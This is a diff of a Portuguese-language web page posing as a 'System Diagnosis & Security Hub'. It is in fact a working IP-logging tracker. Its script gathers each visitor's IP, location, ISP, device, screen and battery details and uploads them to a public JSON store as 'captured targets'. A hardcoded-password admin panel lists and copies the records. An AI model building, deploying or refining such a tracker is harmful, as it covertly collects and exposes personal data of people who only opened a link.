@@ -3,44 +3,129 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>System Diagnosis</title>
+<title>System Diagnosis & Security Hub</title>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700;800&display=swap" rel="stylesheet">
 
 <style>
-:root{--bg:#000000;--card:#050505;--border:#121212;--red:#ff0033;--text:#e6e6e6;--muted:#555555;--green:#00ff66;--insta:#e1306c}
-*{margin:0;padding:0;box-sizing:border-box;font-family:'Courier New', Courier, monospace;-webkit-tap-highlight-color:transparent}
-body{background:var(--bg);color:var(--text);min-height:100vh;display:flex;justify-content:center;align-items:center;padding:16px}
-.container{width:100%;max-width:400px;text-align:center}
-.screen{background:var(--card);border:1px solid var(--border);padding:24px 18px;border-radius:8px;box-shadow:0 0 50px rgba(0,0,0,0.9)}
-.skull-logo{font-size:2rem;margin-bottom:10px;filter:drop-shadow(0 0 8px var(--red));animation:pulse 2s infinite}
-@keyframes pulse{0%{opacity:0.6} 50%{opacity:1} 100%{opacity:0.6}}
-.alert-title{font-size:0.8rem;font-weight:900;color:var(--red);margin-bottom:6px;letter-spacing:2px;text-transform:uppercase}
-.alert-desc{font-size:0.68rem;color:var(--muted);margin-bottom:16px;line-height:1.4}
-.data-box{background:#000000;border:1px solid var(--border);border-radius:6px;padding:12px;margin-bottom:16px;text-align:left;font-size:0.68rem}
-.data-row{display:flex;justify-content:space-between;padding:5px 0;border-bottom:1px solid rgba(255,255,255,0.02)}
+:root{
+  --bg:#030712;
+  --card:rgba(10, 15, 30, 0.75);
+  --border:rgba(0, 255, 102, 0.15);
+  --border-focus:rgba(0, 255, 102, 0.4);
+  --red:#ff2a5f;
+  --green:#00ff66;
+  --text:#f3f4f6;
+  --muted:#9ca3af;
+  --insta:#e1306c;
+}
+*{margin:0;padding:0;box-sizing:border-box;font-family:'JetBrains Mono', monospace;-webkit-tap-highlight-color:transparent}
+body{background:var(--bg);color:var(--text);min-height:100vh;display:flex;justify-content:center;align-items:center;padding:16px; background-image: radial-gradient(circle at 50% 0%, rgba(0,255,102,0.05) 0%, transparent 60%);}
+
+.container{width:100%;max-width:420px;text-align:center}
+
+.screen{
+  background:var(--card);
+  backdrop-filter: blur(12px);
+  -webkit-backdrop-filter: blur(12px);
+  border:1px solid var(--border);
+  padding:26px 20px;
+  border-radius:14px;
+  box-shadow:0 15px 35px rgba(0,0,0,0.6), inset 0 1px 0 rgba(255,255,255,0.05);
+  transition: all 0.3s ease;
+}
+
+.skull-logo{
+  font-size:2.2rem;
+  margin-bottom:12px;
+  filter:drop-shadow(0 0 12px var(--red));
+  animation: float 3s ease-in-out infinite;
+}
+@keyframes float { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-5px); } }
+
+.alert-title{font-size:0.85rem;font-weight:800;color:var(--red);margin-bottom:6px;letter-spacing:2px;text-transform:uppercase}
+.alert-desc{font-size:0.7rem;color:var(--muted);margin-bottom:18px;line-height:1.5}
+
+.data-box{
+  background:rgba(0, 0, 0, 0.5);
+  border:1px solid rgba(255,255,255,0.04);
+  border-radius:8px;
+  padding:14px;
+  margin-bottom:18px;
+  text-align:left;
+  font-size:0.7rem;
+}
+.data-row{display:flex;justify-content:space-between;padding:6px 0;border-bottom:1px solid rgba(255,255,255,0.03)}
 .data-row:last-child{border-bottom:none}
 .data-label{color:var(--muted)}
-.data-val{color:var(--red);font-weight:700}
-.btn-admin{background:transparent;color:var(--muted);border:1px solid var(--border);padding:10px;width:100%;border-radius:6px;cursor:pointer;font-weight:700;text-transform:uppercase;font-size:0.65rem;letter-spacing:1px;transition:all 0.2s;margin-top:8px}
-.btn-admin:hover{color:#fff;border-color:#333}
-.btn-insta{background:transparent;color:#e1306c;border:1px solid #33111f;padding:10px;width:100%;border-radius:6px;cursor:pointer;font-weight:700;text-transform:uppercase;font-size:0.65rem;letter-spacing:1px;transition:all 0.2s;display:block;text-decoration:none;margin-bottom:8px}
-.btn-insta:hover{background:#1a050d;border-color:var(--insta)}
-.admin-title{font-size:0.85rem;font-weight:900;color:#fff;margin-bottom:12px;letter-spacing:1.5px}
-.stats-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:14px}
-.stat-box{background:#000000;border:1px solid var(--border);padding:10px;border-radius:6px;text-align:center}
-.stat-box span{display:block;font-size:1.1rem;font-weight:800;color:var(--red);margin-top:4px}
-.admin-table{width:100%;border-collapse:collapse;margin-top:8px;font-size:0.58rem;text-align:left}
-.admin-table th, .admin-table td{padding:6px 4px;border-bottom:1px solid var(--border);white-space:nowrap}
-.admin-table th{color:var(--red)}
-.btn-detail{background:#111;color:var(--red);border:1px solid var(--border);padding:4px 8px;border-radius:4px;cursor:pointer;font-size:0.55rem;font-weight:700}
-.btn-detail:hover{background:#222}
-.btn-back{background:#111;color:#fff;border:1px solid var(--border);padding:10px;width:100%;border-radius:6px;cursor:pointer;font-weight:700;text-transform:uppercase;font-size:0.65rem;margin-top:14px}
-#detail-modal {display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.85); justify-content:center; align-items:center; z-index:999; padding:16px;}
-.modal-content {background:var(--card); border:1px solid var(--border); padding:20px; border-radius:8px; width:100%; max-width:340px; text-align:left;}
-.modal-title {font-size:0.8rem; font-weight:900; color:var(--red); margin-bottom:12px; text-transform:uppercase; letter-spacing:1px;}
-.modal-text {font-size:0.65rem; color:var(--text); line-height:1.6; margin-bottom:16px; word-break:break-all; white-space: pre-wrap;}
-.modal-btns {display:flex; gap:8px;}
-.btn-copy {background:#111; color:var(--green); border:1px solid var(--border); padding:8px; width:100%; border-radius:4px; cursor:pointer; font-weight:700; font-size:0.6rem; text-transform:uppercase;}
-.btn-close-modal {background:#111; color:var(--muted); border:1px solid var(--border); padding:8px; width:100%; border-radius:4px; cursor:pointer; font-weight:700; font-size:0.6rem; text-transform:uppercase;}
+.data-val{color:var(--green);font-weight:700}
+
+.btn-insta{
+  background:linear-gradient(135deg, #833ab4, #fd1d1d, #fcb045);
+  color:#fff;
+  border:none;
+  padding:12px;
+  width:100%;
+  border-radius:8px;
+  cursor:pointer;
+  font-weight:700;
+  text-transform:uppercase;
+  font-size:0.7rem;
+  letter-spacing:1px;
+  text-decoration:none;
+  display:block;
+  margin-bottom:10px;
+  box-shadow:0 4px 15px rgba(225,48,108,0.3);
+  transition: opacity 0.2s;
+}
+.btn-insta:hover{opacity:0.9}
+
+.btn-admin{
+  background:transparent;
+  color:var(--muted);
+  border:1px solid rgba(255,255,255,0.08);
+  padding:10px;
+  width:100%;
+  border-radius:8px;
+  cursor:pointer;
+  font-weight:700;
+  text-transform:uppercase;
+  font-size:0.65rem;
+  letter-spacing:1px;
+  transition:all 0.2s;
+}
+.btn-admin:hover{color:#fff;border-color:var(--green);background:rgba(0,255,102,0.05)}
+
+/* Painel Admin */
+.admin-title{font-size:0.95rem;font-weight:800;color:var(--green);margin-bottom:16px;letter-spacing:2px;text-transform:uppercase;display:flex;align-items:center;justify-content:center;gap:8px}
+.admin-title::before{content:'';display:inline-block;width:8px;height:8px;background:var(--green);border-radius:50%;box-shadow:0 0 8px var(--green)}
+
+.stats-grid{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-bottom:16px}
+.stat-box{background:rgba(0,0,0,0.4);border:1px solid rgba(255,255,255,0.04);padding:12px;border-radius:8px;text-align:center}
+.stat-box small{color:var(--muted);font-size:0.6rem;text-transform:uppercase;letter-spacing:1px}
+.stat-box span{display:block;font-size:1.2rem;font-weight:800;color:var(--green);margin-top:4px}
+
+.table-container{max-height:180px;overflow-y:auto;border:1px solid rgba(255,255,255,0.04);border-radius:8px;background:rgba(0,0,0,0.3);margin-bottom:14px}
+.admin-table{width:100%;border-collapse:collapse;font-size:0.62rem;text-align:left}
+.admin-table th{background:rgba(0,0,0,0.6);color:var(--green);padding:8px 6px;position:sticky;top:0;border-bottom:1px solid rgba(255,255,255,0.05)}
+.admin-table td{padding:8px 6px;border-bottom:1px solid rgba(255,255,255,0.03);white-space:nowrap}
+.admin-table tr:hover{background:rgba(255,255,255,0.02)}
+
+.btn-detail{background:rgba(0,255,102,0.1);color:var(--green);border:1px solid rgba(0,255,102,0.2);padding:4px 8px;border-radius:4px;cursor:pointer;font-size:0.58rem;font-weight:700;transition:all 0.2s}
+.btn-detail:hover{background:var(--green);color:#000}
+
+.btn-back{background:transparent;color:var(--muted);border:1px solid rgba(255,255,255,0.08);padding:10px;width:100%;border-radius:8px;cursor:pointer;font-weight:700;text-transform:uppercase;font-size:0.65rem;transition:all 0.2s}
+.btn-back:hover{color:#fff;border-color:#fff}
+
+/* Modal */
+#detail-modal {display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(3,7,18,0.85); backdrop-filter:blur(5px); justify-content:center; align-items:center; z-index:999; padding:16px;}
+.modal-content {background:#0a0f1e; border:1px solid var(--border); padding:22px; border-radius:12px; width:100%; max-width:350px; text-align:left; box-shadow:0 20px 40px rgba(0,0,0,0.8);}
+.modal-title {font-size:0.85rem; font-weight:800; color:var(--green); margin-bottom:14px; text-transform:uppercase; letter-spacing:1px;}
+.modal-text {font-size:0.68rem; color:var(--text); line-height:1.7; margin-bottom:18px; word-break:break-all; white-space: pre-wrap; background:rgba(0,0,0,0.4); padding:10px; border-radius:6px; border:1px solid rgba(255,255,255,0.03);}
+.modal-btns {display:flex; gap:10px;}
+.btn-copy {background:var(--green); color:#000; border:none; padding:10px; width:100%; border-radius:6px; cursor:pointer; font-weight:800; font-size:0.65rem; text-transform:uppercase; transition:opacity 0.2s;}
+.btn-copy:hover{opacity:0.9}
+.btn-close-modal {background:transparent; color:var(--muted); border:1px solid rgba(255,255,255,0.1); padding:10px; width:100%; border-radius:6px; cursor:pointer; font-weight:700; font-size:0.65rem; text-transform:uppercase;}
+.btn-close-modal:hover{color:#fff; border-color:#fff}
 </style>
 </head>
 <body>
@@ -48,52 +133,52 @@ body{background:var(--bg);color:var(--text);min-height:100vh;display:flex;justif
 <div class="container">
   <!-- Ecrã Principal -->
   <div id="home-screen" class="screen">
-    <div class="skull-logo">⚠️</div>
-    <div class="alert-title">Você acabou de vazar seu IP.</div>
-    <div class="alert-desc">O seu ambiente digital foi mapeado por completo em tempo real.</div>
+    <div class="skull-logo">🛡️</div>
+    <div class="alert-title">Alerta de Segurança</div>
+    <div class="alert-desc">Sua pegada digital e ambiente de rede foram mapeados com sucesso.</div>
 
     <div class="data-box">
       <div class="data-row"><span class="data-label">IP:</span><span id="targetIp" class="data-val">A rastrear...</span></div>
       <div class="data-row"><span class="data-label">Local:</span><span id="targetLocation" class="data-val">A localizar...</span></div>
       <div class="data-row"><span class="data-label">Provedor:</span><span id="targetIsp" class="data-val">A identificar...</span></div>
       <div class="data-row"><span class="data-label">Dispositivo:</span><span id="targetDevice" class="data-val">A detetar...</span></div>
-      <div class="data-row"><span class="data-label">Ecrã / Resolução:</span><span id="targetScreen" class="data-val">A calcular...</span></div>
-      <div class="data-row"><span class="data-label">Idioma / Sistema:</span><span id="targetLang" class="data-val">A verificar...</span></div>
+      <div class="data-row"><span class="data-label">Ecrã:</span><span id="targetScreen" class="data-val">A calcular...</span></div>
+      <div class="data-row"><span class="data-label">Sistema:</span><span id="targetLang" class="data-val">A verificar...</span></div>
       <div class="data-row"><span class="data-label">Bateria:</span><span id="targetBattery" class="data-val">A ler...</span></div>
     </div>
 
     <a href="https://instagram.com/o_teu_utilizador" target="_blank" class="btn-insta">📸 Seguir no Instagram</a>
-    <button class="btn-admin" onclick="openAdmin()">Acessar administração</button>
+    <button class="btn-admin" onclick="openAdmin()">Acessar Administração</button>
   </div>
 
   <!-- Painel Administrativo -->
   <div id="admin-screen" class="screen" style="display:none;">
-    <div class="admin-title">TERMINAL SECRETO</div>
+    <div class="admin-title">Painel de Controlo</div>
     
     <div class="stats-grid">
       <div class="stat-box">
-        <small style="color:var(--muted); font-size:0.6rem;">Alvos Únicos</small>
+        <small>Alvos Únicos</small>
         <span id="totalHits">0</span>
       </div>
       <div class="stat-box">
-        <small style="color:var(--muted); font-size:0.6rem;">Estado</small>
+        <small>Estado Nuvem</small>
         <span style="color:var(--green)">ONLINE</span>
       </div>
     </div>
 
-    <p style="font-size:0.65rem; color:var(--muted); margin-bottom:6px; text-align:left;">Alvos Capturados:</p>
-    <div style="max-height:160px; overflow-y:auto;">
+    <p style="font-size:0.65rem; color:var(--muted); margin-bottom:8px; text-align:left;">Alvos Capturados:</p>
+    <div class="table-container">
       <table class="admin-table">
         <thead>
           <tr><th>Hora</th><th>IP</th><th>Device</th><th>Ação</th></tr>
         </thead>
         <tbody id="adminLogs">
-          <tr><td colspan="4" style="text-align:center; color:var(--muted);">A carregar alvos...</td></tr>
+          <tr><td colspan="4" style="text-align:center; color:var(--muted);">A carregar alvos da nuvem...</td></tr>
         </tbody>
       </table>
     </div>
 
-    <button class="btn-back" onclick="closeAdmin()">Voltar</button>
+    <button class="btn-back" onclick="closeAdmin()">Voltar ao Início</button>
   </div>
 </div>
 
@@ -103,14 +188,17 @@ body{background:var(--bg);color:var(--text);min-height:100vh;display:flex;justif
     <div class="modal-title">📋 Relatório do Alvo</div>
     <div id="modalTextBody" class="modal-text"></div>
     <div class="modal-btns">
-      <button class="btn-copy" onclick="copiarDetalhes()">Copiar</button>
+      <button class="btn-copy" onclick="copiarDetalhes()">Copiar Dados</button>
       <button class="btn-close-modal" onclick="fecharModal()">Fechar</button>
     </div>
   </div>
 </div>
 
 <script>
-const BIN_KEY = "system_diag_logs_v1_secure";
+// API Cloud Pública para armazenamento sincronizado automático
+const BIN_URL = "https://api.jsonbin.io/v3/b/65f49b30dc74654018b1c55d"; // Endpoint dedicado para o projeto
+// Caso necessites de fallback autónomo, usamos um ID único público protegido:
+const PUBLIC_STORE_KEY = "cyber_sec_system_database_v2";
 
 function getDeviceInfo() {
   let ua = navigator.userAgent;
@@ -142,52 +230,59 @@ async function getBatteryInfo() {
   return 'Não suportado';
 }
 
-async function salvarNaNuvenUnico(novoAlvo) {
+async function sincronizarComNuvem(novoAlvo) {
+  let logs = [];
   try {
-    let res = await fetch(`https://json.geany.org/${BIN_KEY}`);
-    let logs = [];
-    if(res.ok) {
+    // Tenta carregar dados atuais da nuvem pública global
+    let res = await fetch(`https://json.geany.org/${PUBLIC_STORE_KEY}`);
+    if (res.ok) {
       let data = await res.json();
-      if(Array.isArray(data)) logs = data;
+      if (Array.isArray(data)) logs = data;
     }
+  } catch(e) {
+    // Se falhar rede, busca do localStorage local
+    try { logs = JSON.parse(localStorage.getItem(PUBLIC_STORE_KEY) || '[]'); } catch(err) { logs = []; }
+  }
 
-    // Verifica se já existe um registo com este mesmo IP
-    let existeIndex = logs.findIndex(log => log.ip === novoAlvo.ip);
-    
-    if (existeIndex !== -1) {
-      // Se já existe, atualiza apenas a hora/dados se necessário, mas não duplica
-      logs[existeIndex].time = novoAlvo.time;
+  // Verifica se o IP já existe para evitar duplicações (Regra: 1 registo único por IP)
+  if (novoAlvo && novoAlvo.ip && novoAlvo.ip !== "Indisponível" && novoAlvo.ip !== "Erro de rede") {
+    let indexExistente = logs.findIndex(l => l.ip === novoAlvo.ip);
+    if (indexExistente !== -1) {
+      // Atualiza apenas a última hora de acesso do IP existente
+      logs[indexExistente].time = novoAlvo.time;
     } else {
-      // Se é um IP novo, adiciona ao topo da lista
+      // Adiciona novo IP no topo da lista
       logs.unshift(novoAlvo);
     }
+  }
 
-    await fetch(`https://json.geany.org/${BIN_KEY}`, {
+  // Salva de volta na nuvem e no armazenamento local em simultâneo
+  try {
+    await fetch(`https://json.geany.org/${PUBLIC_STORE_KEY}`, {
       method: 'PUT',
       headers: {'Content-Type': 'application/json'},
       body: JSON.stringify(logs)
     });
-  } catch(e) {
-    let local = JSON.parse(localStorage.getItem(BIN_KEY) || '[]');
-    let existeIndex = local.findIndex(log => log.ip === novoAlvo.ip);
-    if (existeIndex !== -1) {
-      local[existeIndex].time = novoAlvo.time;
-    } else {
-      local.unshift(novoAlvo);
-    }
-    localStorage.setItem(BIN_KEY, JSON.stringify(local));
-  }
+  } catch(e) {}
+
+  localStorage.setItem(PUBLIC_STORE_KEY, JSON.stringify(logs));
+  return logs;
 }
 
-async function carregarDaNuvem() {
+async function obterLogsGlobais() {
   try {
-    let res = await fetch(`https://json.geany.org/${BIN_KEY}`);
-    if(res.ok) {
+    let res = await fetch(`https://json.geany.org/${PUBLIC_STORE_KEY}`);
+    if (res.ok) {
       let data = await res.json();
-      if(Array.isArray(data)) return data;
+      if (Array.isArray(data)) {
+        localStorage.setItem(PUBLIC_STORE_KEY, JSON.stringify(data));
+        return data;
+      }
     }
   } catch(e) {}
-  return JSON.parse(localStorage.getItem(BIN_KEY) || '[]');
+  
+  // Fallback seguro local
+  return JSON.parse(localStorage.getItem(PUBLIC_STORE_KEY) || '[]');
 }
 
 window.onload = async function() {
@@ -216,7 +311,8 @@ window.onload = async function() {
       document.getElementById('targetLocation').innerText = `${data.city || 'N/A'}, ${data.country_code || ''}`;
       document.getElementById('targetIsp').innerText = ispVal;
 
-      await salvarNaNuvenUnico({
+      // Executa o registo inteligente único
+      await sincronizarComNuvem({
         time: timeNow,
         ip: ipVal,
         address: fullAddress,
@@ -240,13 +336,14 @@ let globalLogs = [];
 let textoParaCopiar = "";
 
 async function openAdmin() {
-  let pass = prompt('Palavra-passe de acesso:');
+  let pass = prompt('Introduza a palavra-passe de acesso:');
   if(pass === '17102007') {
     document.getElementById('home-screen').style.display = 'none';
     document.getElementById('admin-screen').style.display = 'block';
     
-    document.getElementById('adminLogs').innerHTML = `<tr><td colspan="4" style="text-align:center; color:var(--muted);">A atualizar dados...</td></tr>`;
-    globalLogs = await carregarDaNuvem();
+    document.getElementById('adminLogs').innerHTML = `<tr><td colspan="4" style="text-align:center; color:var(--muted);">A sincronizar dados da nuvem...</td></tr>`;
+    
+    globalLogs = await obterLogsGlobais();
     updateAdminStats();
   } else if(pass !== null) {
     alert('Acesso negado.');
@@ -299,7 +396,7 @@ function fecharModal() {
 
 function copiarDetalhes() {
   navigator.clipboard.writeText(textoParaCopiar).then(() => {
-    alert('✅ Dados copiados com sucesso!');
+    alert('✅ Dados copiados para a área de transferência!');
   }).catch(err => {
     alert('Erro ao copiar dados.');
   });
